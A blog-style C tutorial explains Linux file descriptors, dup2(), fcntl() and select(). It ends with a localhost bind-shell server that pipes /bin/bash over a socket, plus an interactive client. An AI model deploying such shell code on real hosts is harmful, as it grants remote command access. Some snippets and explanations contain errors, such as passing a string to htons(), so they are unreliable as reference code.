---
layout: post
title: File Descritors
subtitle: File Descriptors explanation and manipulation with C
tags: [C]
---

## File Descriptors Theory.

### What is a File Descriptor.

A **file descriptor (FD)** is a unique integer identifier used by the operating system to access **files, sockets, pipes and barely any other I/O resource**. Whenever u open a file, a socket or a pipe, the OS assigns to it a file descriptor in order to use it as a handle to write or read from that resource.

In brief terms, a FD is an element that helps the kernel to identify a resource in information transfer operations. 

<br>

### Introduction.

**Information Transfer operations in Linux**

Let starts with *how Linux treats information*. In Linux, or every Unix-like system, everything is treated as a file, including I/O streams. The terminal itself is treated as a especial file located in */dev/* directory (for example /dev/tty). 

In this context, we have three main data streams:

| DataStream | Name	| Description |
|---|---|---|
| stdin	| Standard Input | (Keyboard) |
| stdout |	Standard Output | (Terminal) |
| stderr | Standard Error | (Terminal) |


It is worth to mention that for debug purpouses, the error data stream is treated as a different stream.

This data streams are nothing but entry or departure points for dataflow to be transfered between files. So, the *file descriptor* get sense as an element to identify the file involved in a I/O operation. So, the datastreams above are related over three FDs in any process:

| File Descriptor | DataStream | Name	| Description |
|---|---|---|---|
| 0 | stdin	| Standard Input | (Keyboard) |
| 1 | stdout |	Standard Output | (Terminal) |
| 2 | stderr | Standard Error | (Terminal) |

This means that, whenever there is a new process, this process inherits the FDs of the parent process so it can transfer information over the standard resources which are the keyboard or the terminal. 

<br>

### How file descriptors work. The File Descriptor Table.

File descriptors are managed by the OS kernel, and they point to an entry in a **File Descriptor Table (FDT)**.

Supose we have the following line in C:

```c
int fd = open("test.txt", O_WRONLY | O_CREAT, 0644);
```
The *open()* syscall returns a file descriptor (FD) which get stored in the *int fd* variable. Then, the kernel maps 'fd' to 'text.txt' in the FDT of that process. The value of the fd vinculated to 'text.txt' resource is the lowest value posible in the fd table, in this case, '3'.

The FDT is a real data structure inside the kernel, maintained per process. However, the OS exposes information about it through **/proc/\<PID\>/fd/**, making it accessible as a virtual filesystem

For example; we can access the FDT listing the contents of the following directory. 

```sh
ls -l /proc/[PID]/fd/
```

For example, with the currently running process:

```sh
kali@kali:/proc/self/fd$ ls -la
total 0
dr-x------ 2 kali kali  9 Feb 25 21:33 .
dr-xr-xr-x 9 kali kali  0 Feb 25 21:33 ..
lrwx------ 1 kali kali 64 Feb 25 21:33 0 -> /dev/pts/0
lrwx------ 1 kali kali 64 Feb 25 21:36 1 -> /dev/pts/0
lrwx------ 1 kali kali 64 Feb 25 21:36 10 -> /dev/pts/0
lr-x------ 1 kali kali 64 Feb 25 21:36 12 -> /usr/share/zsh/functions/Completion.zwc
lr-x------ 1 kali kali 64 Feb 25 21:36 14 -> /usr/share/zsh/functions/Completion/Base.zwc
lr-x------ 1 kali kali 64 Feb 25 21:36 15 -> /usr/share/zsh/functions/Misc.zwc
lr-x------ 1 kali kali 64 Feb 25 21:36 16 -> /usr/share/zsh/functions/Completion/Zsh.zwc
lr-x------ 1 kali kali 64 Feb 25 21:36 17 -> /usr/share/zsh/functions/Completion/Unix.zwc
lrwx------ 1 kali kali 64 Feb 25 21:36 2 -> /dev/pts/0
```

<br>

### Low-level example: Mode Swicht, GOFT and File offset.

Now that we briefly get on the FD in the OS. We can try to get in how this work at low-level.

<br>

#### Opening a file. How the kernel assigns a FD.

Consider the following line:

```c
int fd = open("file.txt", O_RDWR | O_CREAT, 0644);
```

- In first instance, the *open()* function (part of the C standard library) and perform a syscall to *sys_open* in Linux (low-level system call provided by the linux kernel). **This mainly done to the CPU to switch from user-space (with a restrict enviroment) to kernel-mode in order to perform a task.** Is worth to note that a syscall poorly configurated is a potential security issue.

- Then, the kernel checks if the process have permissions to access "file.txt".

- If it has, then it creates the file if not exists or locate it if exists in the directory structure.

- Once, the file is locate, the kernel assigns it a file descriptor by updating the *File Descriptor Table (FDT)* of the process. This is performed following the steps:

    - First, the kernel checks the FDT to find the next available file descriptor number (usually the next of 2; 3). 
    - Then, the FDT doesn't store the file or the number it self, it stores a pointer to an entry in the *Global Open File Table (GOFT)* (if the entry for the file descriptor doesn't exists, it gets created); this is system-wide structure that keeps track of all opened files in the system. A example of an entry in this table can be the follow:

        | FD | File Path | Mode | Offset | Reference Count |
        |---|---|---|---|---|
        | 3	| /home/user/file.txt | O_RDONLY | 0 | 1 | 

        So the FDT points to the GOFT and the GOFT points to the path to the file (and also contains the file offset, this will be mentioned below). We can check this GOFT entry in our system by:

        ```sh
        cat /proc/<PID>/fdinfo/<fd>
        ```

        For example:

        ```sh
        kali@kali:~$ cat /proc/self/fdinfo/1
        pos:    0 # --> File offset.
        flags:  0100002 # --> Open flags for file permissions.
        mnt_id: 27 # --> Mount namespace information.
        ino:    3
        ```

<br>

#### Reading and Writing from a file.

Now that we have a file descriptor pointing to a resource, the OS is ready to read or write from that resource. Consider the following line:

```c
char buffer[100];
read(fd, buffer, 100);
```

In the line above, first we create an array with a size for 100 chars. Then:

- The code performs a system call, read() calls to *sys_read* and the CPU switches from userspace to kernel mode.
- Then, the kernel validates *fd* by checking the FDT, then the GOFT, and identifiying the resource and the *file offset* (This keeps track of where the next read or write operation will occur in an open file. At first, this is get initializet to 0, then when a write or read operation is performed, the value of the file offset gets updated).
- The kernel determines how much data to read (in this case from the file offset to 100 bytes obeying the read() parameters). This information get stored in a buffer in kernel space.
- This buffer gets copied from kernel memory to userspace (buffer array) and the file offset gets updated.

Till this is the read operation. Now lets consider the following line:

```c
write(fd, "Hello, World!", 13);
```

In this line, the following steps are performed:

- write() perform a syscall to sys_write and the CPU switchs to Kernel Mode.
- The kernel validates *fd* and retrieve the *file offset* to know the file to write and how much data write.
- The data is write and the *file offset* gets updated.

<br>

#### Closing the file.

Now, consider that we want to close the resource throught the following line:

```c
close(fd);
```

We remember that the FDT maps the fd to an entry in the GOFT and this contains:

- A pointer to the file or inode (the actual resource).
- The file offset.
- A reference count, how many FD actually points to this entry.

When you call close(), a sys call is invoked and the system remove *fd* from FDT but this doesn't means that the entry in GOFT gets deleted. If the reference count drops to 0, the GOFT entry is removed and the resource gets unaccesible from any other process.

<br>

### dup2() function.

Dup() is a syscall described as follows:

```c
#include <unistd.h>

int dup2(int oldfd, int newfd);
```

The dup2() system call performs the task of allocate a new file descriptor that refers to the same as the old file descriptor, specified in newfd. In other words, the file descriptor newfd is adjusted so that it now refers to the same open file description as oldfd.


Step by step, this function:

- Closes newfd if its open.
- Then makes newfd a copy of oldfd by making newfd to point to the same GOFT entry as oldfd in his own FDT (of the process which call dup2()).

This provokes that, if a process call *dup2()*; the information transfer operations carried by oldfd are now handled by newfd in this process.

<br>

### Final example: Bind shell easy.

Lets see an example;

#### Server side code.

Supose we have a C code; like the following:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void) {

    //creating variable listen_sock which is returned by socket() as we need it for the bind(), listen(), and accept() calls 
    int listen_sock = socket(AF_INET, SOCK_STREAM, 0);

    // Building a 'struct' which consists of AF_INET, the interface we want to listen on (all), and a port number to bind on. This entire entity will be referenced in arguments for the next syscall: bind()    
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;           
    server_addr.sin_addr.s_addr = INADDR_ANY;  
    server_addr.sin_port = htons(5555);        

    // Our second syscall, and perhaps the most complicated: bind() 
    bind(listen_sock, (struct sockaddr *)&server_addr, sizeof(server_addr));

    //0 here is our specified backlog, (we dont have one)
    listen(listen_sock, 0);

    //creating new var conn_sock which is returned from accept() and needed for the dup2() call which duplicates this for stdin, stdout, and stderr
    int sockfd = accept(listen_sock, NULL, NULL);

    execve("/bin/bash", NULL, NULL);
}
```

The code above prepare a socket ready to listen income connections in every internet address on port 5555, and then execute through "execve()" syscall "/bin/bash" without arguments.

In this context, execve() would replace the process and socket by efectively spawning a shell. Lets see that, the program create a socket, which is a I/O file resource maintained by the kernel, not by the process it self, so when the process gets replaced with the spawn of a shell, the sockets still being available as a file descriptor, how ever, the new spawned shell have the defaults file descriptors assigned so is unavailable to used it. We can solve this by replacing in the process the default file descriptors through the socket:

```c
dup2(sockfd, 0);
dup2(sockfd, 1);
dup2(sockfd, 2);
```

This C code, replace for the current process the datastreams (input, output and error) the sockfd file descriptor, this effectively means that now, the process read from the socket, writes on the socket and send error messages through the socket.

This is done by updataing in the FDT of the current process the pointers for 0,1 and 2 entries, which now points to sockfd in the GOFT. The global code would look like follows:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {

    int serv_sock = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;           
    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");  
    server_addr.sin_port = htons(4444);        

  
    bind(serv_sock, (struct sockaddr *)&server_addr, sizeof(server_addr));

   
    listen(serv_sock, 0);

    printf("[+] Socket is listening on 127.0.0.1:4444\n"); //Always put '\n' at the end of a stdout fd connected to a terminal in order to trigger the bufer. Other way the printf() function will not display anything. 

    int sockfd = accept(serv_sock, NULL, NULL);

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2); //Replace file stdin, stdout and stderr for current process

    execve("/bin/bash", NULL, NULL);

    return 0;
}
```

<br>

#### Client-side code.

Lets now create a client code which would connect with the program above in order to send or receive data through the socket to the spawned shell to get fully interactive control of the program:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/select.h>

int main() {
   
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons("4444");
    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");

    connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)); //Create a socket and connect

    printf("[+] Connected to bind shell at %s:%d\n", "127.0.0.1", "4444");

    fcntl(0, F_SETFL, O_NONBLOCK);// Enable non-blocking mode on stdin


    // 5. Main loop: read from socket and stdin, forward data
    while (true) {
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(sockfd, &fds); // Watch socket
        FD_SET(0, &fds); // Watch keyboard input

        // Use select() to wait for activity on either stdin or the socket
        if (select(sockfd + 1, &fds, NULL, NULL, NULL) < 0) {
            perror("[-] Select error");
            break;
        }

        // Read from the socket and print to the terminal
        if (FD_ISSET(sockfd, &fds)) {
            char buffer[1024];
            int bytes = read(sockfd, buffer, sizeof(buffer) - 1);
            if (bytes <= 0) {
                printf("[-] Connection closed\n");
                break;
            }
            buffer[bytes] = '\0';
            printf("%s", buffer);
            fflush(stdout);
        }

        // Read from stdin and send to the socket
        if (FD_ISSET(0, &fds)) {
            char input[1024];
            int bytes = read(0, input, sizeof(input) - 1);
            if (bytes > 0) {
                input[bytes] = '\0';
                write(sockfd, input, bytes);
            }
        }
    }

    close(sockfd);
    return 0;
}
```

Lets break up this code.

<br>

##### Create socket and connect.

There is nothing special in this part:

```c
int sockfd = socket(AF_INET, SOCK_STREAM, 0);

struct sockaddr_in server_addr;
server_addr.sin_family = AF_INET;
server_addr.sin_port = htons("4444");
server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");

connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)); //Create a socket and connect

printf("[+] Connected to bind shell at %s:%d\n", "127.0.0.1", "4444");
```

It just create a socket, deine the properties of the socket (family address, port, ip address), and then attemps to connect. In behalf of simplicity, with skip the checks.

<br>

##### fcntl. Enable non-blocking mode on stdin.

The term *fcntl* stands for **file control** and referes to a function that allows file descriptors manipulation. More precisely, *fcntl()* performs one of the operations described below on the open  file descriptor. 

```c
 #include <fcntl.h>

int fcntl(int fd, int op, ... /* arg */ );
```

The operation is determined by *op*. There is a third argument that could be required by the *op* value. In this case, the functionality of *fcntl* is described by the following line:

```c
fcntl(0, F_SETFL, O_NONBLOCK);
```

So, there are three arguments that are being pass to fcntl;

- **0**; This is the file descriptor that is gonna be manipulated; stdin.
- **F_SETFL**; This command set a *file status flag*.
- **O_NONBLOCK**; In this case, *op* (F_SETFL), requires a third argument which is a flag that makes input non-blocking, meaning *read()* calls on *0* (stdin) file descriptor will return immediately instead of waiting for user input.

This prevents the following behaviour.

By default, file descriptors operates in **blocking mode**, this means that, when you call *read()* over a file descritor, the program waits until data is received by read and then lets the flow execution to continue. In this case, read would waits until the remote host send some data which can be *disruptive* in terms of network comunication's tempo.

In order to prevent programs blocking or simply large waiting times, we use *fcntl()* to set a flag over the stdin file descriptor in order to not block the program until some data is received.

<br>

##### Monitoring I/O data transfer.

In order to handle I/O data transfer over the socket into the spawned shell we implement the following *while* loop:

```c
while (true) {
    fd_set fds;
    FD_ZERO(&fds);
    FD_SET(sockfd, &fds); // Watch socket
    FD_SET(0, &fds); // Watch keyboard input

    // Use select() to wait for activity on either stdin or the socket
    if (select(sockfd + 1, &fds, NULL, NULL, NULL) < 0) {
        perror("[-] Select error");
        break;
    }

    // Read from the socket and print to the terminal
    if (FD_ISSET(sockfd, &fds)) {
        char buffer[1024];
        int bytes = read(sockfd, buffer, sizeof(buffer) - 1);
        if (bytes <= 0) {
            printf("[-] Connection closed\n");
            break;
        }
        buffer[bytes] = '\0';
        printf("%s", buffer);
        fflush(stdout);
    }

    // Read from stdin and send to the socket
    if (FD_ISSET(0, &fds)) {
        char input[1024];
        int bytes = read(0, input, sizeof(input) - 1);
        if (bytes > 0) {
            input[bytes] = '\0';
            write(sockfd, input, bytes);
        }
    }
}
```

It uses mainly *select()* function to multiplex system calls provided by several files. In other words, is used to wait for activity in either of the available file descriptors; keyboard (stdin) or socket.

Lets break it up.

<br>

**1. Infinity Loop**

This first line;

```c
while(true){
    //code
    break;
}
```

Makes while to repeat the loop indefenitely until a *break condition* happens. In the code, break conditions occurs when a check statement detects a failure in network communication flow. Then, while loop breaks and the programs continue with the inmediate next line after the loop. 

<br>

**2. Select() function**

As we said above: *select()* function is a multiplexing system call used for monitoring multiple file descriptors (FDs) to see if they are ready for reading, writing, or exceptions.

The function has the following prototype:

```c
#include <sys/select.h>

int select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout);
```

First, we have to say that *fd_set* is a data structure used mainly with *select()*. It represents a **set of file descriptors**, in fact is a bit array, where each bite represents a file descriptor.

Now, we get along with the arguments of the select function:

- **nfds** is the **highest file descriptor + 1** to monitor.
- **readfds** the fds to check file descriptors ready to be read.
- **writefds** the fds to check the file descriptors ready to bre wrote in.
- **errorsfds** the fds to check the file descriptors ready to give exceptions (stderr).
- **timeout** maximum in seconds of time before the return of select.

The function return the number of FDs that changed or 0 if none changed:

- **>0**; Number of FDs that changed state.
- **0**; timeout, no FDs changed.
- **-1**; Error ocurred.

*Select* works by passing to him a prepared fd_set of structures with *FD_SET()* and *FD_ZERO()* Macros.  For example;

```c
fd_set readfds;
FD_ZERO(&readfds); //Clear variable readfds. 
FD_SET(fd, &readfds); // Add 'fd' to readfds variable.
select(sockfd + 1, &readfds, NULL, NULL, NULL); //Use readfds in select to select those fds ready to be read.  
```

There are also *FD_ISSET()* which checks if 'fd' is ready for I/O operations on 'readfds'.

So this loop creates a fd_set variable and set it with stdin and our socket:

```c
fd_set fds;
FD_ZERO(&fds);
FD_SET(sockfd, &fds);
FD_SET(0, &fds);
```

Then, the code waits for select to receive data from the socket or the keyboard:

```c
if (select(sockfd + 1, &fds, NULL, NULL, NULL) < 0) {
    perror("[-] Select error");
    break;
}
```

Then we check if the socket or the keyboard are ready to be receive data and display it or send to the socket if there is:

```c
if (FD_ISSET(sockfd, &fds)) {
    char buffer[1024];
    int bytes = read(sockfd, buffer, sizeof(buffer) - 1);
    if (bytes <= 0) {
        printf("[-] Connection closed\n");
        break;
    }
    buffer[bytes] = '\0';
    printf("%s", buffer);
    fflush(stdout);
}

// Read from stdin and send to the socket
if (FD_ISSET(0, &fds)) {
    char input[1024];
    int bytes = read(0, input, sizeof(input) - 1);
    if (bytes > 0) {
        input[bytes] = '\0';
        write(sockfd, input, bytes);
    }
}
```

We can see that if we receive from the socket a value inferior to 0, then this means that the connection is closed and we break the loop.

<br>

